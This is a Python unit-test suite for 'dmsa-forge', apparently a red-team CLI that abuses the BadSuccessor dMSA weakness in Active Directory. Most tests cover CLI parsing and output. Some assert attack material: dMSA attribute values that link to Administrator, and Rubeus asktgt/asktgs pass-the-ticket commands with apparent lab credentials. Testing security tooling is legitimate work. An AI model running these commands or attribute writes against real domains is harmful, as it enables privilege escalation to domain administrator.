import contextlib
import io
import json
import logging
import os
import subprocess
import sys
import tempfile
import types
import unittest

from dmsa_forge import cli


REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BASE_ARGS = [
    'test.local/admin:pw',
    '--target-ou',
    'OU=Staff,DC=test,DC=local',
    '--target-account',
    'Administrator',
    '--scope-domain',
    'test.local',
    '--scope-base-dn',
    'DC=test,DC=local',
]


def run_cli(*args, cwd=None, env_overrides=None):
    env = os.environ.copy()
    env['PYTHONPATH'] = REPO_ROOT + os.pathsep + env.get('PYTHONPATH', '')
    if env_overrides:
        for key, value in env_overrides.items():
            if value is None:
                env.pop(key, None)
            else:
                env[key] = value
    return subprocess.run(
        [sys.executable, '-m', 'dmsa_forge.cli'] + list(args),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        cwd=cwd,
        env=env,
    )


class FakeLDAPConnection:
    def __init__(self, success=False, result=None, entries=None):
        self.success = success
        self.result = result
        self.entries = list(entries or [])

    def search(self, **kwargs):
        return self.success


def minimal_forge():
    forge = object.__new__(cli.DMSAForge)
    forge._scope_base_dn = 'DC=test,DC=local'
    forge._base_dn = 'DC=test,DC=local'
    forge._redact = True
    forge._allow_admin_fallback = False
    forge._dmsa_name_supplied = False
    forge.report = {'inference': []}
    return forge


def execution_options(**overrides):
    values = dict(cli.CLI_DEFAULTS)
    values.update({
        'account': 'test.local/admin:pw',
        'action': 'assess',
        'base_dn': 'DC=test,DC=local',
        'scope_domain': 'test.local',
        'scope_base_dn': 'DC=test,DC=local',
        'operation_id': 'test-operation',
        'skip_dc_prereq': True,
    })
    values.update(overrides)
    return cli.argparse.Namespace(**values)


class DNValidationTests(unittest.TestCase):
    def test_validates_escaped_dn_and_scope(self):
        dn = r'CN=Doe\, Jane,OU=Staff,DC=test,DC=local'
        self.assertTrue(cli.validate_dn_syntax(dn))
        self.assertTrue(cli.dn_in_scope(dn, 'DC=test,DC=local'))
        self.assertEqual(
            cli.format_dn_for_display(dn, base_dn='DC=test,DC=local', redact=True),
            r'CN=Doe\, Jane,OU=Staff,DC=test,DC=local',
        )

    def test_parent_ou_from_dn(self):
        self.assertEqual(
            cli.parent_ou_from_dn(r'CN=Doe\, Jane,OU=Staff,DC=test,DC=local'),
            'OU=Staff,DC=test,DC=local',
        )
        self.assertEqual(
            cli.parent_ou_from_dn('CN=User,OU=Staff,OU=People,DC=test,DC=local'),
            'OU=Staff,OU=People,DC=test,DC=local',
        )
        self.assertIsNone(cli.parent_ou_from_dn('CN=Administrator,CN=Users,DC=test,DC=local'))

    def test_rejects_unescaped_comma_in_dn_value(self):
        dn = 'CN=Doe, Jane,OU=Staff,DC=test,DC=local'
        self.assertFalse(cli.validate_dn_syntax(dn))

    def test_rejects_dangling_dn_escape(self):
        dn = 'CN=Bad,OU=Staff,DC=test,DC=local\\'
        self.assertFalse(cli.validate_dn_syntax(dn))

    def test_rejects_unescaped_boundary_spaces_in_dn_values(self):
        self.assertFalse(cli.validate_dn_syntax('CN= John,DC=test,DC=local'))
        self.assertFalse(cli.validate_dn_syntax('CN=John ,DC=test,DC=local'))

    def test_accepts_escaped_boundary_space_and_hex_escape(self):
        self.assertTrue(cli.validate_dn_syntax(r'CN=\ John,DC=test,DC=local'))
        self.assertTrue(cli.validate_dn_syntax(r'CN=John\ ,DC=test,DC=local'))
        self.assertTrue(cli.validate_dn_syntax(r'CN=John\20,DC=test,DC=local'))

    def test_rejects_invalid_dn_escape_sequences(self):
        self.assertFalse(cli.validate_dn_syntax(r'CN=John\Z,DC=test,DC=local'))
        self.assertFalse(cli.validate_dn_syntax(r'CN=John\2G,DC=test,DC=local'))


class CLIBehaviorTests(unittest.TestCase):
    def test_removed_help_utilities_return_migration_errors(self):
        for command in ('actions', 'examples', 'help'):
            result = run_cli(command)
            self.assertEqual(result.returncode, 2)
            self.assertIn('was removed', result.stderr)
            self.assertIn('dmsa-forge ACTION -h', result.stderr)

    def test_startup_banner_is_professional_and_local(self):
        output = io.StringIO()
        with contextlib.redirect_stdout(output):
            cli.print_startup_banner()

        banner = output.getvalue()
        self.assertIn('%s %s - by %s' % (cli.TOOL_NAME, cli.TOOL_VERSION, cli.MODIFICATIONS_BY), banner)
        self.assertIn('A redteaming tool for authorized BadSuccessor LDAP exploitation on dMSA', banner)
        self.assertIn(".-.| | \\/ | `-.  /___\\   ____ |--- .-. .--..-.. .-.", banner)
        self.assertIn(cli.PROJECT_URL, banner)
        self.assertLess(
            banner.index('A redteaming tool for authorized BadSuccessor LDAP exploitation on dMSA'),
            banner.index(cli.PROJECT_URL),
        )
        self.assertIn('Email: 888256@gmail.com', banner)
        self.assertLess(banner.index(cli.PROJECT_URL), banner.index('Email: 888256@gmail.com'))
        self.assertIn("._.'\n%s" % cli.PROJECT_URL, banner)
        self.assertNotIn("._.'\n\n%s" % cli.PROJECT_URL, banner)
        self.assertNotIn('\nBy RedteamNotes\n', banner)
        self.assertNotIn('d888888', banner)
        self.assertNotIn('`7MM', banner)
        self.assertNotIn('.oPYo8', banner)
        self.assertNotIn('Impacket', banner)
        self.assertNotIn('SecureAuth', banner)
        self.assertNotIn('Fortra', banner)

    def test_terminal_color_formatter_colors_warning_and_error_only(self):
        formatter = cli.TerminalColorFormatter(logging.Formatter('%(levelname)s: %(message)s'))
        info_record = logging.LogRecord('test', logging.INFO, __file__, 1, 'info sample', (), None)
        warning_record = logging.LogRecord('test', logging.WARNING, __file__, 1, 'warning sample', (), None)
        error_record = logging.LogRecord('test', logging.ERROR, __file__, 1, 'error sample', (), None)

        self.assertEqual(formatter.format(info_record), 'INFO: info sample')
        self.assertEqual(formatter.format(warning_record), '%sWARNING: warning sample%s' % (cli.ANSI_YELLOW, cli.ANSI_RESET))
        self.assertEqual(formatter.format(error_record), '%sERROR: error sample%s' % (cli.ANSI_RED, cli.ANSI_RESET))

    def test_existence_check_treats_no_such_object_as_absent(self):
        forge = minimal_forge()
        connection = FakeLDAPConnection(result={
            'result': 32,
            'description': 'error',
            'message': 'Error in searchRequest -> noSuchObject: problem 2001 (NO_OBJECT)',
        })

        self.assertFalse(forge.check_account_exists(connection, 'CN=redpen,OU=Staff,DC=test,DC=local'))

    def test_existence_check_keeps_non_no_such_object_as_unknown(self):
        forge = minimal_forge()
        connection = FakeLDAPConnection(result={
            'result': 50,
            'description': 'error',
            'message': 'insufficientAccessRights',
        })

        self.assertIsNone(forge.check_account_exists(connection, 'CN=redpen,OU=Staff,DC=test,DC=local'))

    def test_action_specific_help(self):
        result = run_cli('add', '-h')

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        self.assertIn('usage: dmsa-forge add [domain/]username[:password] --target-ou OU_DN [options]', result.stdout)
        self.assertIn('--target-account', result.stdout)

    def test_unknown_action_specific_help_fails_cleanly(self):
        result = run_cli('plan', 'unknown')

        self.assertEqual(result.returncode, 2)
        self.assertIn('Unknown plan action', result.stderr)

    def test_action_flag_workflow_is_removed(self):
        result = run_cli(
            'add',
            'test.local/admin:pw',
            '--action',
            'add',
            '--target-ou',
            'OU=Staff,DC=test,DC=local',
            '--target-account',
            'Administrator',
        )

        self.assertEqual(result.returncode, 2)
        self.assertIn('--action was removed', result.stderr)
        self.assertIn('dmsa-forge add', result.stderr)

    def test_account_first_workflow_is_removed(self):
        result = run_cli('test.local/admin:pw')

        self.assertEqual(result.returncode, 2)
        self.assertIn('unrecognized action: test.local/admin:pw', result.stderr)
        self.assertNotIn('was removed', result.stderr)

    def test_global_help_is_grouped(self):
        result = run_cli('-h', env_overrides={'SHELL': '/bin/zsh'})

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        self.assertIn('usage: dmsa-forge', result.stdout)
        self.assertIn('assess', result.stdout)
        self.assertIn('add', result.stdout)
        self.assertIn('update', result.stdout)
        self.assertNotIn('Diagnostics:', result.stdout)
        self.assertNotIn('local readiness:', result.stdout)
        self.assertNotIn('dmsa-forge doctor', result.stdout)
        self.assertNotIn('dmsa-forge doctor [domain/]username[:password]', result.stdout)
        self.assertNotIn('doctor       Inspect local inputs without LDAP writes.', result.stdout)
        self.assertNotIn(cli.TOOL_DESCRIPTION + '\n\npositional arguments:', result.stdout)
        self.assertIn('Use "dmsa-forge ACTION -h" for action-specific options.', result.stdout)
        self.assertNotIn('Completion for this shell session', result.stdout)
        self.assertIn('-v, --version', result.stdout)
        self.assertNotIn('--version, -v', result.stdout)
        self.assertNotIn('Legacy', result.stdout)
        self.assertNotIn('LDAP' + '-stage research', result.stdout)
        self.assertNotIn('eval "$(dmsa-forge --completion-script zsh)"', result.stdout)
        self.assertNotIn('actions', result.stdout)
        self.assertNotIn('examples', result.stdout)

    def test_empty_command_prints_help(self):
        result = run_cli(env_overrides={'SHELL': '/bin/zsh'})

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        self.assertIn('usage: dmsa-forge', result.stdout)
        self.assertIn('assess', result.stdout)
        self.assertNotIn('Diagnostics:', result.stdout)
        self.assertNotIn('local readiness:', result.stdout)
        self.assertNotIn('dmsa-forge doctor', result.stdout)
        self.assertNotIn('dmsa-forge doctor [domain/]username[:password]', result.stdout)
        self.assertNotIn('doctor       Inspect local inputs without LDAP writes.', result.stdout)
        self.assertIn('Use "dmsa-forge ACTION -h" for action-specific options.', result.stdout)
        self.assertNotIn('Completion for this shell session', result.stdout)
        self.assertIn('-v, --version', result.stdout)
        self.assertNotIn('Legacy', result.stdout)
        self.assertNotIn('LDAP' + '-stage research', result.stdout)
        self.assertNotIn('actions', result.stdout)
        self.assertNotIn('examples', result.stdout)

    def test_main_restores_cwd_for_empty_command_path(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            start_cwd = os.getcwd()
            changed_cwd = os.path.join(tmpdir, 'changed')
            os.mkdir(changed_cwd)

            def fake_help(parser, shell=None, no_banner=False):
                os.chdir(changed_cwd)

            original_help = cli.print_parser_help_with_hint
            try:
                cli.print_parser_help_with_hint = fake_help
                result = cli.main([])
            finally:
                cli.print_parser_help_with_hint = original_help
                os.chdir(start_cwd)

        self.assertEqual(result, 0)
        self.assertEqual(os.getcwd(), start_cwd)

    def test_main_restores_cwd_for_completion_path(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            start_cwd = os.getcwd()
            changed_cwd = os.path.join(tmpdir, 'changed')
            os.mkdir(changed_cwd)

            def fake_completion(shell):
                os.chdir(changed_cwd)
                return 0

            original_completion = cli.run_completion_script
            try:
                cli.run_completion_script = fake_completion
                result = cli.main(['--completion-script', 'zsh'])
            finally:
                cli.run_completion_script = original_completion
                os.chdir(start_cwd)

        self.assertEqual(result, 0)
        self.assertEqual(os.getcwd(), start_cwd)

    def test_version_short_flag(self):
        result = run_cli('-v')

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        self.assertIn(cli.TOOL_VERSION, result.stdout)

    def test_action_first_help_is_action_specific(self):
        result = run_cli('add', '-h')

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        self.assertIn('usage: dmsa-forge add', result.stdout)
        self.assertIn('--target-account', result.stdout)
        self.assertIn('options:', result.stdout)
        self.assertNotIn('local controls:', result.stdout)
        self.assertNotIn('workflow:', result.stdout)
        self.assertNotIn('LDAP:', result.stdout)
        self.assertNotIn('--help-advanced', result.stdout)
        self.assertNotIn('\\\n', result.stdout)
        self.assertNotIn('--hashes', result.stdout)
        self.assertNotIn(', -dc-host', result.stdout)
        self.assertNotIn(', -target-ou', result.stdout)
        self.assertNotIn(', -method', result.stdout)
        self.assertNotIn('--allow-admin-fallback', result.stdout)
        self.assertNotIn('--next-step-prefix', result.stdout)

    def test_action_help_keeps_requirements_in_description_not_blocks(self):
        for action in ('assess', 'add', 'verify', 'delete'):
            with self.subTest(action=action):
                result = run_cli(action, '-h')

                self.assertEqual(result.returncode, 0, msg=result.stderr)
                self.assertNotIn('Required:', result.stdout)
                self.assertNotIn('Safety:', result.stdout)
                self.assertNotIn('local controls:', result.stdout)

    def test_doctor_help_flattens_local_controls(self):
        result = run_cli('doctor', '-h')

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        self.assertIn('options:', result.stdout)
        self.assertNotIn('local controls:', result.stdout)

    def test_action_help_prints_banner_on_interactive_terminal(self):
        output = io.StringIO()
        original_should_show_banner = cli.should_show_banner
        try:
            cli.should_show_banner = lambda options=None: True
            with contextlib.redirect_stdout(output):
                result = cli.main(['assess', '--help'])
        finally:
            cli.should_show_banner = original_should_show_banner

        text = output.getvalue()
        self.assertEqual(result, 0)
        self.assertIn('%s %s - by %s' % (cli.TOOL_NAME, cli.TOOL_VERSION, cli.MODIFICATIONS_BY), text)
        self.assertIn(cli.PROJECT_URL, text)
        self.assertIn('usage: dmsa-forge assess', text)

    def test_empty_action_commands_print_action_help(self):
        for action in ('assess', 'add', 'verify', 'delete'):
            with self.subTest(action=action):
                result = run_cli(action)

                self.assertEqual(result.returncode, 0, msg=result.stderr)
                self.assertIn('usage: dmsa-forge %s' % action, result.stdout)
                self.assertIn('[domain/]username[:password]', result.stdout)
                self.assertEqual(result.stderr, '')

    def test_single_dash_long_options_are_rejected(self):
        result = run_cli('add', '-dc-host', 'dc.test.local', '--no-banner')

        self.assertEqual(result.returncode, 2)
        self.assertIn('unrecognized arguments: -dc-host', result.stderr)

    def test_action_advanced_help_is_removed(self):
        result = run_cli('add', 'test.local/admin:pw', '--help-advanced')

        self.assertEqual(result.returncode, 2)
        self.assertIn('unrecognized arguments: --help-advanced', result.stderr)
        self.assertNotIn('advanced options for add', result.stdout)

    def test_plan_command_maps_to_dry_run(self):
        result = run_cli('plan', 'add', *BASE_ARGS, '--output-only')

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        self.assertEqual(payload['action'], 'add')
        self.assertEqual(payload['mode'], 'dry_run')
        self.assertTrue(payload['controls']['dry_run'])

    def test_completion_script_hidden_flag_outputs_shell_snippets(self):
        zsh = run_cli('--completion-script', 'zsh')
        bash = run_cli('--completion-script', 'bash')

        self.assertEqual(zsh.returncode, 0, msg=zsh.stderr)
        self.assertEqual(bash.returncode, 0, msg=bash.stderr)
        self.assertIn('eval "$(dmsa-forge --completion-script zsh)"', zsh.stdout)
        self.assertIn('compdef _dmsa_forge dmsa-forge dmsaforge', zsh.stdout)
        self.assertIn('complete -F _dmsa_forge_completion dmsa-forge', bash.stdout)
        self.assertIn('complete -F _dmsa_forge_completion dmsaforge', bash.stdout)
        self.assertIn('update', zsh.stdout)
        self.assertIn('update', bash.stdout)
        self.assertNotIn('actions', zsh.stdout)
        self.assertNotIn('examples', zsh.stdout)
        self.assertNotIn('actions', bash.stdout)
        self.assertNotIn('examples', bash.stdout)
        self.assertNotIn('doctor', zsh.stdout)
        self.assertNotIn('doctor', bash.stdout)
        self.assertNotIn('completion:print completion', zsh.stdout)
        self.assertNotIn('config', zsh.stdout)
        self.assertNotIn('--config', zsh.stdout)
        self.assertNotIn('config', bash.stdout)
        self.assertNotIn('--config', bash.stdout)
        self.assertNotIn('--include-sd', zsh.stdout)
        self.assertNotIn('--include-sd', bash.stdout)

    def test_package_installs_collision_safe_alias(self):
        with open(os.path.join(REPO_ROOT, 'pyproject.toml'), 'r', encoding='utf-8') as handle:
            pyproject = handle.read()

        self.assertIn('dmsa-forge = "dmsa_forge.cli:main"', pyproject)
        self.assertIn('dmsaforge = "dmsa_forge.cli:main"', pyproject)

    def test_config_command_and_option_are_removed(self):
        command = run_cli('config', 'show')
        init = run_cli('init')
        option = run_cli('add', *BASE_ARGS, '--dry-run', '--config', 'x.toml')

        self.assertEqual(command.returncode, 2)
        self.assertEqual(init.returncode, 2)
        self.assertEqual(option.returncode, 2)
        self.assertIn('no longer uses project config files', command.stderr)
        self.assertIn('no longer uses project config files', init.stderr)
        self.assertIn('unrecognized arguments: --config', option.stderr)

    def test_removed_actions_return_migration_errors(self):
        guidance = run_cli('guidance', 'test.local/admin:pw', '--dmsa-name', 'redpen')
        modify = run_cli('modify', *BASE_ARGS, '--dmsa-name', 'redpen', '--yes')
        completion = run_cli('completion', 'zsh', env_overrides={'SHELL': '/bin/zsh'})
        search = run_cli('search', 'test.local/admin:pw')
        actions = run_cli('actions')
        examples = run_cli('examples')
        help_command = run_cli('help', 'add')
        legacy_modify = run_cli('test.local/admin:pw', '--action', 'modify')
        legacy_search = run_cli('test.local/admin:pw', '--action', 'search')

        self.assertEqual(guidance.returncode, 2)
        self.assertEqual(modify.returncode, 2)
        self.assertEqual(completion.returncode, 2)
        self.assertEqual(search.returncode, 2)
        self.assertEqual(actions.returncode, 2)
        self.assertEqual(examples.returncode, 2)
        self.assertEqual(help_command.returncode, 2)
        self.assertEqual(legacy_modify.returncode, 2)
        self.assertEqual(legacy_search.returncode, 2)
        self.assertIn('successful add/verify output includes Kerberos commands', guidance.stderr)
        self.assertIn('use delete/add/verify', modify.stderr)
        self.assertIn('--completion-script zsh', completion.stderr)
        self.assertIn('unrecognized action: search', search.stderr)
        self.assertNotIn('was removed', search.stderr)
        self.assertIn('dmsa-forge ACTION -h', actions.stderr)
        self.assertIn('dmsa-forge ACTION -h', examples.stderr)
        self.assertIn('dmsa-forge ACTION -h', help_command.stderr)
        self.assertIn('--action was removed', legacy_modify.stderr)
        self.assertIn('--action was removed', legacy_search.stderr)

    def test_update_dry_run_uses_current_python_environment(self):
        source = '%s@v0.5.3' % cli.DEFAULT_UPDATE_SOURCE
        result = run_cli('update', '--dry-run', '--no-banner', '--source', source)

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        self.assertIn('Current version:', result.stdout)
        self.assertIn('Target version:  v0.5.3', result.stdout)
        self.assertIn('Version source:', result.stdout)
        self.assertIn('Update command:', result.stdout)
        self.assertIn('-m pip install --upgrade', result.stdout)
        self.assertIn(source, result.stdout)
        self.assertNotIn('usage:', result.stderr)

    def test_update_skips_when_target_version_matches(self):
        source = '%s@%s' % (cli.DEFAULT_UPDATE_SOURCE, cli.TOOL_VERSION)
        result = run_cli('update', '--dry-run', '--no-banner', '--source', source)

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        self.assertIn('Current version:', result.stdout)
        self.assertIn('No update required; versions match.', result.stdout)
        self.assertNotIn('Update command:', result.stdout)

    def test_update_stays_quiet_when_cwd_contains_command_named_checkout(self):
        source = '%s@%s' % (cli.DEFAULT_UPDATE_SOURCE, cli.TOOL_VERSION)
        with tempfile.TemporaryDirectory() as tmpdir:
            os.mkdir(os.path.join(tmpdir, 'dmsa-forge'))
            result = run_cli('update', '--dry-run', '--no-banner', '--source', source, cwd=tmpdir)

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        self.assertIn('No update required; versions match.', result.stdout)
        self.assertNotIn('current directory contains', result.stdout)
        self.assertNotIn('dmsaforge', result.stdout)

    def test_update_quiet_stays_quiet_when_cwd_contains_command_named_checkout(self):
        source = '%s@%s' % (cli.DEFAULT_UPDATE_SOURCE, cli.TOOL_VERSION)
        with tempfile.TemporaryDirectory() as tmpdir:
            os.mkdir(os.path.join(tmpdir, 'dmsa-forge'))
            result = run_cli('update', '--dry-run', '--no-banner', '--quiet', '--source', source, cwd=tmpdir)

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        self.assertNotIn('current directory contains', result.stdout)

    def test_update_unknown_source_requires_force(self):
        result = run_cli('update', '--dry-run', '--no-banner', '--source', 'git+https://example.test/project.git')

        self.assertEqual(result.returncode, 1)
        self.assertIn('Could not determine update target version', result.stderr)
        self.assertIn('update --force', result.stderr)
        self.assertNotIn('Update command:', result.stdout)

    def test_update_force_runs_without_version_check(self):
        source = 'git+https://example.test/project.git'
        result = run_cli('update', '--dry-run', '--no-banner', '--force', '--source', source)

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        self.assertIn('Update command:', result.stdout)
        self.assertIn(source, result.stdout)

    def test_update_restores_working_directory(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            start_cwd = os.getcwd()
            changed_cwd = os.path.join(tmpdir, 'changed')
            os.mkdir(changed_cwd)

            def fake_run(command, cwd=None):
                self.assertEqual(cwd, start_cwd)
                os.chdir(changed_cwd)
                return types.SimpleNamespace(returncode=0)

            original_run = cli.subprocess.run
            try:
                cli.subprocess.run = fake_run
                options = execution_options(
                    action='update',
                    force=True,
                    dry_run=False,
                    quiet=True,
                    no_banner=True,
                    update_source='git+https://example.test/project.git',
                )
                result = cli.run_update(options)
            finally:
                cli.subprocess.run = original_run
                os.chdir(start_cwd)

        self.assertEqual(result, 0)
        self.assertEqual(os.getcwd(), start_cwd)

    def test_default_update_source_is_pinned_to_resolved_release_tag(self):
        self.assertEqual(
            cli.update_source_for_command(cli.DEFAULT_UPDATE_SOURCE, cli.TOOL_VERSION, 'latest GitHub release'),
            '%s@%s' % (cli.DEFAULT_UPDATE_SOURCE, cli.TOOL_VERSION),
        )

    def test_ldap_compat_skips_non_entry_search_answers(self):
        class SearchReference:
            def __getitem__(self, key):
                raise TypeError("'<' not supported between instances of 'str' and 'int'")

        compat = object.__new__(cli.LDAPCompat)

        self.assertEqual(compat._entries_from_answers([SearchReference()]), [])

    def test_execute_rejects_invalid_dmsa_name_before_ldap(self):
        result = run_cli('add', *BASE_ARGS, '--dmsa-name', 'bad,name', '--dry-run', '--output-only')

        self.assertEqual(result.returncode, 2)
        self.assertIn('--dmsa-name must be a DNS-safe label', result.stderr)

    def test_execute_rejects_invalid_dns_hostname_before_ldap(self):
        result = run_cli('add', *BASE_ARGS, '--dns-hostname', 'not-a-fqdn', '--dry-run', '--output-only')

        self.assertEqual(result.returncode, 2)
        self.assertIn('--dns-hostname must be a DNS hostname', result.stderr)

    def test_execute_rejects_invalid_principals_allowed_dn_before_ldap(self):
        result = run_cli(
            'add',
            *BASE_ARGS,
            '--principals-allowed',
            'CN=Reader,CN=Users,DC=test,DC=local\\',
            '--dry-run',
            '--output-only',
        )

        self.assertEqual(result.returncode, 2)
        self.assertIn('--principals-allowed DN is not a valid distinguished name', result.stderr)

    def test_execute_rejects_principals_allowed_dn_outside_scope(self):
        result = run_cli(
            'add',
            *BASE_ARGS,
            '--principals-allowed',
            'CN=Reader,CN=Users,DC=other,DC=local',
            '--dry-run',
            '--output-only',
        )

        self.assertEqual(result.returncode, 2)
        self.assertIn('--principals-allowed DN is outside --scope-base-dn', result.stderr)

    def test_output_write_failure_is_clean_error(self):
        result = run_cli(
            'add',
            *BASE_ARGS,
            '--dry-run',
            '--output-only',
            '--output',
            '/no/such/directory/report.json',
        )

        self.assertEqual(result.returncode, 1)
        self.assertEqual(result.stdout, '')
        self.assertIn('Could not write output file', result.stderr)
        self.assertNotIn('Traceback', result.stderr)

    def test_output_only_stdout_defaults_to_json(self):
        result = run_cli('add', *BASE_ARGS, '--dry-run', '--output-only')

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        self.assertEqual(payload['schema_version'], '1.0')
        self.assertEqual(payload['action'], 'add')
        self.assertTrue(payload['controls']['dry_run'])
        self.assertTrue(payload['controls']['output_only'])
        self.assertTrue(payload['controls']['quiet'])
        self.assertTrue(payload['controls']['no_banner'])
        self.assertIn('next_steps', payload['result'])
        self.assertIn('dmsa-forge add test.local/admin:pw', payload['result']['next_steps'][0]['command'])
        self.assertEqual(payload['controls']['next_step_prefix'], '(none)')

    def test_human_add_dry_run_shows_badsuccessor_values_not_ldap_json(self):
        result = run_cli(
            'add',
            'test.local/admin:pw',
            '--target-ou',
            'OU=Staff,DC=test,DC=local',
            '--target-account',
            'CN=Administrator,CN=Users,DC=test,DC=local',
            '--principals-allowed',
            'S-1-5-21-1-2-3-1604',
            '--dmsa-name',
            'redpen',
            '--dry-run',
            '--no-banner',
        )
        output = result.stdout + result.stderr

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        self.assertIn('Run context', output)
        self.assertIn('Planned values', output)
        self.assertIn('Account:', output)
        self.assertIn('test.local/admin:pw', output)
        self.assertIn('Method:                  LDAP (inferred)', output)
        self.assertIn('Port:                    389 (inferred)', output)
        self.assertIn('DC Host:                 test.local (inferred)', output)
        self.assertIn('Base DN:                 DC=test,DC=local (inferred)', output)
        self.assertIn('Scope Domain:            test.local (inferred)', output)
        self.assertIn('Scope Base DN:           DC=test,DC=local (inferred)', output)
        self.assertIn('DNS Hostname:            redpen.test.local (inferred)', output)
        self.assertIn('BadSuccessor values:', output)
        self.assertIn('msDS-GroupMSAMembership:', output)
        self.assertIn('allow S-1-5-21-1-2-3-1604', output)
        self.assertIn('msDS-DelegatedMSAState:             2 - migration complete', output)
        self.assertIn('msDS-ManagedAccountPrecededByLink:', output)
        self.assertIn('CN=Administrator,CN=Users,DC=test,DC=local', output)
        self.assertIn('dNSHostName:                        redpen.test.local (inferred)', output)
        self.assertNotIn('Inference:', output)
        self.assertNotIn('Planned LDAP operations:', output)
        self.assertNotIn('Run this action:', output)
        self.assertNotIn('\"type\": \"add\"', output)
        self.assertNotIn('<redacted>', output)
        self.assertNotIn('<SID>', output)

    def test_add_dry_run_marks_target_and_principal_as_required(self):
        result = run_cli(
            'add',
            'test.local/admin:pw',
            '--target-ou',
            'OU=Staff,DC=test,DC=local',
            '--dmsa-name',
            'redpen',
            '--dry-run',
            '--no-banner',
        )
        output = result.stdout + result.stderr

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        self.assertIn('Target Account:          (required for add execution)', output)
        self.assertIn('Principals Allowed:      (required for add execution)', output)
        self.assertIn('msDS-ManagedAccountPrecededByLink:', output)
        self.assertIn('(required for execution)', output)
        self.assertNotIn('Action "add" requires', output)

    def test_add_execution_requires_target_account_and_principals_allowed(self):
        result = run_cli(
            'add',
            'test.local/admin:pw',
            '--target-ou',
            'OU=Staff,DC=test,DC=local',
            '--dmsa-name',
            'redpen',
            '--no-banner',
        )

        self.assertEqual(result.returncode, 2)
        self.assertIn('Action "add" execution requires: --target-account, --principals-allowed', result.stderr)
        self.assertIn('dmsa-forge plan add', result.stderr)

    def test_human_next_step_suggests_dmsa_name_from_target_account(self):
        result = run_cli(
            'add',
            'eighteen.htb/adam.scott:iloveyou1',
            '--dc-host',
            'dc01.eighteen.htb',
            '--target-ou',
            'OU=Staff,DC=eighteen,DC=htb',
            '--target-account',
            'redpen',
            '--principals-allowed',
            'S-1-5-21-1152179935-589108180-1989892463-1604',
            '--dry-run',
            '--no-banner',
            env_overrides={
                'PROXYCHAINS_CONF_FILE': 'chain1080.conf',
                'PROXYCHAINS_QUIET_MODE': '1',
            },
        )
        output = result.stdout + result.stderr

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        self.assertIn('Next steps', output)
        self.assertIn(
            "proxychains -f chain1080.conf -q dmsa-forge add eighteen.htb/adam.scott:iloveyou1 --dc-host dc01.eighteen.htb --target-ou OU=Staff,DC=eighteen,DC=htb --dmsa-name redpen --target-account Administrator --principals-allowed S-1-5-21-1152179935-589108180-1989892463-1604",
            output,
        )
        self.assertNotIn('<TARGET_ACCOUNT_DN_OR_SAM>', output)
        self.assertNotIn('suggested default', output)
        self.assertNotIn('Run this action:', output)

    def test_next_steps_infer_proxychains_prefix(self):
        result = run_cli(
            'add',
            *BASE_ARGS,
            '--dry-run',
            '--output-only',
            env_overrides={
                'PROXYCHAINS_CONF_FILE': 'chain1080.conf',
                'PROXYCHAINS_QUIET_MODE': '1',
            },
        )

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        command = payload['result']['next_steps'][0]['command']
        self.assertTrue(
            command.startswith('proxychains -f chain1080.conf -q dmsa-forge add test.local/admin:pw'),
            msg=command,
        )
        self.assertEqual(payload['controls']['next_step_prefix'], 'proxychains -f chain1080.conf -q')

    def test_next_step_prefix_can_be_explicit(self):
        result = run_cli(
            'add',
            *BASE_ARGS,
            '--dry-run',
            '--output-only',
            '--next-step-prefix',
            'proxychains -f chain1080.conf -q',
        )

        self.assertEqual(result.returncode, 0, msg=result.stderr)
        payload = json.loads(result.stdout)
        self.assertTrue(payload['result']['next_steps'][0]['command'].startswith('proxychains -f chain1080.conf -q dmsa-forge add'))

    def test_add_success_next_steps_include_direct_kerberos_commands(self):
        options = execution_options(
            action='add',
            account='eighteen.htb/adam.scott:iloveyou1',
            dc_ip='10.129.23.216',
            dc_ip_supplied=True,
            dmsa_name='redpen',
            target_ou='OU=Staff,DC=eighteen,DC=htb',
            principals_allowed='S-1-5-21-1152179935-589108180-1989892463-1604',
        )
        report = {'result': {}}

        cli.attach_next_steps(report, options, mode='execute', success=True)

        commands = [step['command'] for step in report['result']['next_steps']]
        joined = '\n'.join(commands)
        self.assertIn(r'.\Rubeus.exe hash /user:adam.scott /password:iloveyou1 /domain:eighteen.htb', joined)
        self.assertIn(r'.\Rubeus.exe asktgt /user:adam.scott /aes256:<AES256_HASH_FROM_RUBEUS_HASH> /domain:eighteen.htb /dc:10.129.23.216 /outfile:adam.scott.kirbi /nowrap', joined)
        self.assertIn(r".\Rubeus.exe asktgs /dmsa /opsec /service:krbtgt/EIGHTEEN.HTB /targetuser:'redpen$' /ticket:adam.scott.kirbi /dc:10.129.23.216 /ptt /nowrap", joined)
        self.assertNotIn('asktgt /user:adam.scott /password:', joined)
        self.assertNotIn('--kerberos-guidance', joined)
        self.assertNotIn('<DC_IPV4>', joined)
        self.assertNotIn('<PASSWORD>', joined)

    def test_auto_dc_ip_rejects_proxy_dns_and_special_addresses(self):
        rejected = [
            '224.0.0.1',
            '127.0.0.1',
            '169.254.1.10',
            '0.0.0.0',
            '255.255.255.255',
            '240.0.0.1',
        ]
        for value in rejected:
            self.assertFalse(cli.is_usable_auto_dc_ip(value), msg=value)
            self.assertIsNone(cli.resolve_ipv4_address(value, usable_only=True), msg=value)

        self.assertTrue(cli.is_usable_auto_dc_ip('10.129.23.216'))
